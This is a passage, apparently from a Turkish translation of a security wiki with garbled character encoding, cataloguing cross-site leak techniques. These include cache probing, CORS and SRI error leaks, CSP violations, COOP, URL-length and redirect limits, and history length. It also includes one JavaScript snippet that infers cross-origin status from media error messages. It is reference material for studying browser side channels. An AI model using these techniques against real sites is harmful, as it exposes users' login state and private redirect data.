Bu ayrÄ±ca bir Zamanlama saldÄ±rÄ±sÄ± ile de yapÄ±labilir (daha fazla bilgi iÃ§in belgeye bakÄ±n).

### Ã–nbellek

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Ã–zet:** Bir kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performance API](./#performance-api) kullanÄ±larak bir kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ± kontrol edilebilir.

### AÄŸ SÃ¼resi

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Ã–zet:** Bir isteÄŸin aÄŸ sÃ¼resi `performance` API'den alÄ±nabilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Hata MesajlarÄ± TekniÄŸi

### Medya HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: HTML Ã–ÄŸeleri (Video, Ses)
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Ã–zet:** Firefox'ta bir Ã§apraz kÃ¶ken isteÄŸin durum kodunu doÄŸru bir ÅŸekilde sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)

```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```

### CORS HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ã–zet:** GÃ¼venlik BeyanlarÄ±nda (SA), CORS hata mesajlarÄ± yanlÄ±ÅŸlÄ±kla yÃ¶nlendirilen isteklerin tam URL'sini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldÄ±rganÄ±n Webkit tabanlÄ± tarayÄ±cÄ±larÄ±n CORS isteklerini nasÄ±l ele aldÄ±ÄŸÄ±nÄ± sÃ¶mÃ¼rerek **Ã§apraz kaynak sitenin yÃ¶nlendirme hedefini Ã§Ä±karmasÄ±na** olanak tanÄ±r. Ã–zellikle, bir **CORS etkin istek**, kullanÄ±cÄ± durumuna baÄŸlÄ± olarak yÃ¶nlendirme yapan bir hedef siteye gÃ¶nderildiÄŸinde ve tarayÄ±cÄ± daha sonra isteÄŸi reddettiÄŸinde, hata mesajÄ± iÃ§inde **yÃ¶nlendirmenin tam URL'si** ifÅŸa edilir. Bu zayÄ±flÄ±k sadece yÃ¶nlendirme gerÃ§eÄŸini ortaya Ã§Ä±karmakla kalmaz, aynÄ± zamanda yÃ¶nlendirmenin son noktasÄ±nÄ± ve iÃ§erebileceÄŸi **duyarlÄ± sorgu parametrelerini** de aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.

### SRI HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ã–zet:** GÃ¼venlik BeyanlarÄ±nda (SA), CORS hata mesajlarÄ± yanlÄ±ÅŸlÄ±kla yÃ¶nlendirilen isteklerin tam URL'sini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldÄ±rgan, **aÅŸÄ±rÄ± detaylÄ± hata mesajlarÄ±nÄ±** kullanarak Ã§apraz kaynak yanÄ±tlarÄ±nÄ±n boyutunu Ã§Ä±karmak iÃ§in SRI mekanizmasÄ±nÄ± sÃ¶mÃ¼rebilir. Bu, Subresource Integrity (SRI) mekanizmasÄ±nÄ±n, genellikle CDN'lerden alÄ±nan kaynaklarÄ±n deÄŸiÅŸtirilmediÄŸini doÄŸrulamak iÃ§in bÃ¼tÃ¼nlÃ¼k Ã¶zniteliÄŸini kullandÄ±ÄŸÄ± gerÃ§eÄŸinden kaynaklanmaktadÄ±r. SRI'nin Ã§apraz kaynak kaynaklarÄ± Ã¼zerinde Ã§alÄ±ÅŸmasÄ± iÃ§in bunlarÄ±n **CORS etkin** olmasÄ± gerekir; aksi takdirde bÃ¼tÃ¼nlÃ¼k kontrollerine tabi deÄŸillerdir. GÃ¼venlik BeyanlarÄ±nda (SA), CORS hatasÄ± XS-Leak gibi, bir bÃ¼tÃ¼nlÃ¼k Ã¶zniteliÄŸine sahip bir istek baÅŸarÄ±sÄ±z olduÄŸunda bir hata mesajÄ± yakalanabilir. SaldÄ±rganlar, herhangi bir isteÄŸin bÃ¼tÃ¼nlÃ¼k Ã¶zniteliÄŸine **sahte bir kripto deÄŸeri atayarak** bu hatayÄ± kasÄ±tlÄ± olarak **tetikleyebilir**. SA'da, ortaya Ã§Ä±kan hata mesajÄ± yanlÄ±ÅŸlÄ±kla istenen kaynaÄŸÄ±n iÃ§erik uzunluÄŸunu ifÅŸa eder. Bu bilgi sÄ±zÄ±ntÄ±sÄ±, bir saldÄ±rganÄ±n yanÄ±t boyutundaki deÄŸiÅŸiklikleri ayÄ±rt etmesine olanak tanÄ±r, bu da sofistike XS-Leak saldÄ±rÄ±larÄ± iÃ§in yol aÃ§ar.

### CSP Ä°hlali/Tespiti

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Ã–zet:** CSP yalnÄ±zca kurbanÄ±n web sitesine izin verirse ve eriÅŸildiÄŸinde farklÄ± bir etki alanÄ±na yÃ¶nlendirilmeye Ã§alÄ±ÅŸÄ±lÄ±rsa CSP, algÄ±lanabilir bir hataya neden olacaktÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak Ã§apraz kaynak bir sitenin farklÄ± bir kÃ¶k etki alanÄ±na yÃ¶nlendirilip yÃ¶nlendirilmediÄŸini tespit edebilir. Bu sÄ±zÄ±ntÄ± yÃ¶nlendirmeyi tespit edebilir, ancak ayrÄ±ca yÃ¶nlendirme hedefinin etki alanÄ± da sÄ±zar. Bu saldÄ±rÄ±nÄ±n temel fikri, **saldÄ±rgan sitesindeki hedef etki alanÄ±na izin vermek**tir. Bir istek hedef etki alanÄ±na gÃ¶nderildiÄŸinde, bu etki alanÄ± **Ã§apraz kaynak bir etki alana yÃ¶nlendirilir**. **CSP**, buna eriÅŸimi engeller ve bir sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±lan bir **ihlal raporu oluÅŸturur**. TarayÄ±cÄ±ya baÄŸlÄ± olarak, **bu rapor yÃ¶nlendirmenin hedef konumunu sÄ±zdÄ±rabilir**.\
Modern tarayÄ±cÄ±lar yÃ¶nlendirildiÄŸi URL'yi belirtmeyebilir, ancak hala bir Ã§apraz kaynak yÃ¶nlendirmesinin tetiklendiÄŸini tespit edebilirsiniz.

### Ã–nbellek

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Ã–zet:** Ã–nbellekten dosyayÄ± temizleyin. Hedef sayfayÄ± aÃ§Ä±n, dosyanÄ±n Ã¶nbellekte olup olmadÄ±ÄŸÄ±nÄ± kontrol edin.
* **Kod Ã–rneÄŸi:**

TarayÄ±cÄ±lar tÃ¼m web siteleri iÃ§in ortak bir Ã¶nbellek kullanabilir. KÃ¶kenlerinden baÄŸÄ±msÄ±z olarak, bir hedef sayfanÄ±n **belirli bir dosyayÄ± isteyip istemediÄŸini** Ã§Ä±karmak mÃ¼mkÃ¼ndÃ¼r.

Bir sayfa yalnÄ±zca kullanÄ±cÄ± giriÅŸ yaptÄ±ÄŸÄ±nda bir resmi yÃ¼klÃ¼yorsa, **kaynaÄŸÄ± geÃ§ersiz kÄ±labilirsiniz** (eÄŸer Ã¶nbellekteyse artÄ±k Ã¶nbellekte deÄŸilse, daha fazla bilgi iÃ§in baÄŸlantÄ±lara bakÄ±n), bu kaynaÄŸÄ± yÃ¼kleyebilecek bir isteÄŸi **gerÃ§ekleÅŸtirin** ve kaynaÄŸÄ± **kÃ¶tÃ¼ bir istekle yÃ¼klemeye Ã§alÄ±ÅŸÄ±n** (Ã¶rneÄŸin, aÅŸÄ±rÄ± uzun bir baÅŸvuru baÅŸlÄ±ÄŸÄ± kullanarak). Kaynak yÃ¼kleme **herhangi bir hata tetiklemediyse**, bu, kaynaÄŸÄ±n **Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±** anlamÄ±na gelir.

### CSP YÃ¶nergesi

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Ã–zet:** CSP baÅŸlÄ±k yÃ¶nergeleri, CSP iframe Ã¶zniteliÄŸini kullanarak sorgulanabilir ve politika ayrÄ±ntÄ±larÄ± ortaya Ã§Ä±karÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'da (GC) yeni bir Ã¶zellik, bir iframe Ã¶ÄŸesine bir Ã¶znitelik ayarlayarak web sayfalarÄ±nÄ±n **Bir Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP)** Ã¶nermesine izin verir ve politika yÃ¶nergeleri HTTP isteÄŸi ile iletilir. Genellikle, gÃ¶mÃ¼lÃ¼ iÃ§erik bunu **bir HTTP baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla yetkilendirmelidir**, aksi takdirde bir **hata sayfasÄ± gÃ¶rÃ¼ntÃ¼lenir**. Ancak, eÄŸer iframe zaten bir CSP tarafÄ±ndan yÃ¶netiliyorsa ve yeni Ã¶nerilen politika daha kÄ±sÄ±tlayÄ±cÄ± deÄŸilse, sayfa normal ÅŸekilde yÃ¼klenecektir. Bu mekanizma, bir saldÄ±rganÄ±n Ã§apraz kÃ¶kenli bir sayfanÄ±n belirli CSP yÃ¶nergelerini **belirlemesine olanak tanÄ±r**, Ã§Ã¼nkÃ¼ hata sayfasÄ±nÄ± tanÄ±mlayabilir. Bu zayÄ±flÄ±k dÃ¼zeltilmiÅŸ olarak iÅŸaretlendi, ancak bulgularÄ±mÄ±z, hata sayfasÄ±nÄ± tespit edebilen **yeni bir sÄ±zÄ±ntÄ± tekniÄŸini** ortaya koyarak, temel sorunun asla tam olarak ele alÄ±nmadÄ±ÄŸÄ±nÄ± gÃ¶stermektedir.

### **CORP**

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Ã–zet:** Cross-Origin Resource Policy (CORP) ile korunan kaynaklar, yasaklanan bir kÃ¶kenden alÄ±ndÄ±ÄŸÄ±nda bir hata fÄ±rlatacaktÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP baÅŸlÄ±ÄŸÄ±, belirli bir kaynaÄŸa **no-cors Ã§apraz kÃ¶ken isteklerini engellediÄŸinde bir hata fÄ±rlatacak** olan nispeten yeni bir web platformu gÃ¼venlik Ã¶zelliÄŸidir. BaÅŸlÄ±ÄŸÄ±n varlÄ±ÄŸÄ± algÄ±lanabilir, Ã§Ã¼nkÃ¼ CORP ile korunan bir kaynaÄŸa **eriÅŸildiÄŸinde bir hata fÄ±rlatÄ±r**.

### CORB

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha Fazla Bilgi**: [nosniff baÅŸlÄ±ÄŸÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± tespit etme](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Ã–zet**: CORB, saldÄ±rganlarÄ±n isteÄŸin iÃ§inde **`nosniff` baÅŸlÄ±ÄŸÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± tespit etmelerine** olanak tanÄ±yabilir.
* **Kod Ã–rneÄŸi**: [CORB SÄ±zÄ±ntÄ±sÄ±](https://xsinator.com/testing.html#CORB%20Leak) iÃ§in baÄŸlantÄ±ya bakÄ±n.

SaldÄ±rÄ± hakkÄ±nda daha fazla bilgi iÃ§in baÄŸlantÄ±ya bakÄ±n.

### CORS hatasÄ± Origin YansÄ±ma yanlÄ±ÅŸ yapÄ±landÄ±rma <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha Fazla Bilgi**: [cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Ã–zet**: EÄŸer Origin baÅŸlÄ±ÄŸÄ± `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nda yansÄ±tÄ±lÄ±yorsa, bir kaynaÄŸÄ±n Ã¶nbellekte olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: [cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

EÄŸer **Origin baÅŸlÄ±ÄŸÄ±**, `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nda **yansÄ±tÄ±lÄ±yorsa**, bir saldÄ±rgan bu davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanarak **CORS** modunda **kaynaÄŸÄ± almaya Ã§alÄ±ÅŸabilir**. EÄŸer bir **hata oluÅŸmazsa**, bu, kaynaÄŸÄ±n **web'den doÄŸru ÅŸekilde alÄ±ndÄ±ÄŸÄ±** anlamÄ±na gelir, eÄŸer bir hata **oluÅŸursa**, bu, kaynaÄŸÄ±n **Ã¶nbellekten alÄ±ndÄ±ÄŸÄ± anlamÄ±na gelir** (hata, Ã¶nbelleÄŸin, orijinal alanÄ± izin veren bir CORS baÅŸlÄ±ÄŸÄ± ile bir yanÄ±tÄ± kaydettiÄŸi iÃ§in ortaya Ã§Ä±kar).\
UnutulmamalÄ±dÄ±r ki, eÄŸer origin yansÄ±tÄ±lmÄ±yorsa ancak joker karakteri kullanÄ±lÄ±yorsa (`Access-Control-Allow-Origin: *`), bu Ã§alÄ±ÅŸmayacaktÄ±r.

## Okunabilir Ã–znitelik TekniÄŸi

### Fetch YÃ¶nlendirme

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [Fetch YÃ¶nlendirme SÄ±zÄ±ntÄ±sÄ±](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Ã–zet:** YÃ¶nlendirme tamamlandÄ±ktan sonra yanÄ±tÄ±n tÃ¼rÃ¼nÃ¼ (opaqueredirect) kontrol etmek iÃ§in GC ve SA kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [Fetch YÃ¶nlendirme SÄ±zÄ±ntÄ±sÄ±](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diÄŸer parametrelerle Fetch API kullanarak bir istek gÃ¶ndererek, `response.type` Ã¶zniteliÄŸini okumak mÃ¼mkÃ¼ndÃ¼r ve eÄŸer bu `opaqueredirect` ile eÅŸitse, yanÄ±t bir yÃ¶nlendirmedir.

### COOP

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [COOP SÄ±zÄ±ntÄ±sÄ±](https://xsinator.com/paper.pdf) (5.4), [Pencere ReferanslarÄ±na SaldÄ±rÄ±lar](https://xsleaks.dev/docs/attacks/window-references/)
* **Ã–zet:** Cross-Origin Opener Policy (COOP) tarafÄ±ndan korunan sayfalar, Ã§apraz kÃ¶ken etkileÅŸimlerden eriÅŸimi engeller.
* **Kod Ã–rneÄŸi**: [COOP SÄ±zÄ±ntÄ±sÄ±](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldÄ±rgan, Ã§apraz kÃ¶kenli bir HTTP yanÄ±tÄ±nda Cross-Origin Opener Policy (COOP) baÅŸlÄ±ÄŸÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilir. COOP, web uygulamalarÄ± tarafÄ±ndan harici sitelerin rastgele pencere referanslarÄ±na eriÅŸmesini engellemek iÃ§in kullanÄ±lÄ±r. Bu baÅŸlÄ±ÄŸÄ±n gÃ¶rÃ¼nÃ¼rlÃ¼ÄŸÃ¼, **`contentWindow` referansÄ±na** eriÅŸmeye Ã§alÄ±ÅŸarak anlaÅŸÄ±labilir. COOP koÅŸullu olarak uygulandÄ±ÄŸÄ±nda, **`opener` Ã¶zelliÄŸi** belirleyici bir gÃ¶sterge haline gelir: COOP etkin olduÄŸunda **tanÄ±msÄ±z** olurken, etkin olmadÄ±ÄŸÄ±nda **tanÄ±mlÄ±** olur.

### URL Maksimum UzunluÄŸu - Sunucu TarafÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API, HTML ElemanlarÄ±
* **AlgÄ±lanabilir Fark**: Durum Kodu / Ä°Ã§erik
* **Daha Fazla Bilgi**: [Sunucu TarafÄ± YÃ¶nlendirmeleri](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Ã–zet:** Sunucu tarafÄ±ndan verilen yÃ¶nlendirme yanÄ±tlarÄ±ndaki farklÄ±lÄ±klarÄ± algÄ±lamak, yanÄ±tÄ±n uzunluÄŸunun Ã§ok bÃ¼yÃ¼k olmasÄ± nedeniyle sunucunun bir hata ile yanÄ±t vermesi ve bir uyarÄ± oluÅŸturulmasÄ± mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: [URL Maksimum Uzunluk SÄ±zÄ±ntÄ±sÄ±](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

EÄŸer bir sunucu tarafÄ± yÃ¶nlendirmesi, **yÃ¶nlendirmede kullanÄ±cÄ± girdisi iÃ§eriyorsa** ve **ekstra veri** varsa, bu davranÄ±ÅŸÄ± tespit etmek mÃ¼mkÃ¼ndÃ¼r Ã§Ã¼nkÃ¼ genellikle **sunucularÄ±n bir istek uzunluk sÄ±nÄ±rÄ±** vardÄ±r. EÄŸer **kullanÄ±cÄ± verisi** bu **uzunluk - 1** ise, Ã§Ã¼nkÃ¼ **yÃ¶nlendirme** bu veriyi kullanÄ±yor ve **ekstra bir ÅŸey ekliyorsa**, bir **hata Error Events aracÄ±lÄ±ÄŸÄ±yla algÄ±lanabilir**.

EÄŸer bir kullanÄ±cÄ±ya **Ã§erezler atayabilirseniz**, bu saldÄ±rÄ±yÄ± **yeterli sayÄ±da Ã§erez atayarak** da gerÃ§ekleÅŸtirebilirsiniz ([**Ã§erez bombasÄ±**](../hacking-with-cookies/cookie-bomb.md)) bÃ¶ylece **doÄŸru yanÄ±tÄ±n boyutu arttÄ±ÄŸÄ±nda bir hata** tetiklenir. Bu durumda, bu isteÄŸi aynÄ± siteden tetiklerseniz, `<script>` otomatik olarak Ã§erezleri gÃ¶nderir (bu nedenle hatalarÄ± kontrol edebilirsiniz).\
**Ã‡erez bombasÄ± + XS-Search** Ã¶rneÄŸi, bu yazÄ±nÄ±n amaÃ§lanan Ã§Ã¶zÃ¼mÃ¼nde bulunabilir: [amaÃ§lanan](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Bu tÃ¼r bir saldÄ±rÄ± iÃ§in genellikle **SameSite=None** veya aynÄ± baÄŸlamda olmak gereklidir.

### URL Maksimum UzunluÄŸu - Ä°stemci TarafÄ±

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Durum Kodu / Ä°Ã§erik
* **Daha Fazla Bilgi**: [Chrom'un 2MB URL sÄ±nÄ±rÄ±](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Ã–zet:** YanÄ±tÄ±n uzunluÄŸundaki farklÄ±lÄ±klarÄ± algÄ±lamak, bir isteÄŸin Ã§ok bÃ¼yÃ¼k bir yÃ¶nlendirme yanÄ±tÄ± iÃ§in uzun olmasÄ± nedeniyle fark edilebilecek bir fark olabilir.
* **Kod Ã–rneÄŸi**: [Chrom'un 2MB URL sÄ±nÄ±rÄ±](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) gÃ¶re, Chrome'un maksimum URL uzunluÄŸu 2MB'dir.

> Genel olarak, _web platformu_ URL'lerin uzunluÄŸuna sÄ±nÄ±rlama getirmez (ancak 2^31 yaygÄ±n bir sÄ±nÄ±rdÄ±r). _Chrome_, uygulama nedenleri ve ara iÅŸlem iletiÅŸiminde hizmet reddi sorunlarÄ±na neden olmamak iÃ§in URL'leri **2MB**'ye kadar sÄ±nÄ±rlar.

Bu nedenle, **yÃ¶nlendirme URL'si** bir durumda daha bÃ¼yÃ¼kse, bu, **2MB'den bÃ¼yÃ¼k bir URL ile yÃ¶nlendirme yapÄ±labilir** ve **uzunluk sÄ±nÄ±rÄ±na ulaÅŸÄ±labilir**. Bu durumda, Chrome, bir **`about:blank#blocked`** sayfasÄ± gÃ¶sterir.

**Fark edilebilir fark**, eÄŸer **yÃ¶nlendirme** tamamlandÄ±ysa, `window.origin` bir **hata fÄ±rlatÄ±r** Ã§Ã¼nkÃ¼ Ã§apraz kÃ¶ken bu bilgiye eriÅŸemez. Ancak, **limit** aÅŸÄ±ldÄ±ÄŸÄ±nda ve yÃ¼klenen sayfa **`about:blank#blocked`** ise pencerenin **`origin`**'i **ana sayfanÄ±n**ki gibi kalÄ±r, bu da **eriÅŸilebilir bir bilgidir**.

**2MB'ye** ulaÅŸmak iÃ§in gereken tÃ¼m ek bilgiler, baÅŸlangÄ±Ã§taki URL'de bir **hash** ile eklenerek yÃ¶nlendirmede **kullanÄ±labilir** hale getirilebilir.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### Maksimum YÃ¶nlendirmeler

* **Dahil Etme YÃ¶ntemleri**: Fetch API, Frames
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Ã–zet:** URL yÃ¶nlendirmelerinin gerÃ§ekleÅŸip gerÃ§ekleÅŸmediÄŸini belirlemek iÃ§in tarayÄ±cÄ±nÄ±n yÃ¶nlendirme sÄ±nÄ±rÄ±nÄ± kullanÄ±n.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

EÄŸer bir tarayÄ±cÄ±nÄ±n takip edeceÄŸi **maksimum** yÃ¶nlendirme sayÄ±sÄ± **20** ise, bir saldÄ±rgan sayfasÄ±nÄ± **19 yÃ¶nlendirme** ile yÃ¼klemeyi deneyebilir ve sonunda **kurbanÄ±** test edilen sayfaya **yÃ¶nlendirebilir**. EÄŸer bir **hata** tetiklenirse, o zaman sayfa kurbanÄ± **yÃ¶nlendirmeye Ã§alÄ±ÅŸÄ±yordu**.

### GeÃ§miÅŸ UzunluÄŸu

* **Dahil Etme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: YÃ¶nlendirmeler
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Ã–zet:** JavaScript kodu tarayÄ±cÄ± geÃ§miÅŸini manipÃ¼le edebilir ve uzunluk Ã¶zelliÄŸi ile eriÅŸilebilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**GeÃ§miÅŸ API** JavaScript koduna tarayÄ±cÄ± geÃ§miÅŸini manipÃ¼le etme izni verir, bu da bir kullanÄ±cÄ±nÄ±n ziyaret ettiÄŸi sayfalarÄ± **kaydeder**. Bir saldÄ±rgan uzunluk Ã¶zelliÄŸini dahil etme yÃ¶ntemi olarak kullanabilir: JavaScript ve HTML gezinmesini algÄ±lamak iÃ§in.\
**`history.length` kontrol edilir**, bir kullanÄ±cÄ±nÄ±n bir sayfaya **gezinmesi**, onu **aynÄ± kÃ¶k dizine geri dÃ¶nÃ¼ÅŸtÃ¼rmesi** ve **`history.length`**'in yeni deÄŸerini **kontrol etmesi**.

### AynÄ± URL ile GeÃ§miÅŸ UzunluÄŸu

* **Dahil Etme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: URL tahmin edilenle aynÄ± mÄ±
* **Ã–zet:** GeÃ§miÅŸ uzunluÄŸunu kÃ¶tÃ¼ye kullanarak bir Ã§erÃ§eve/aÃ§Ä±lÄ±r pencerenin konumunun belirli bir URL'de olup olmadÄ±ÄŸÄ±nÄ± tahmin etmek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: AÅŸaÄŸÄ±da

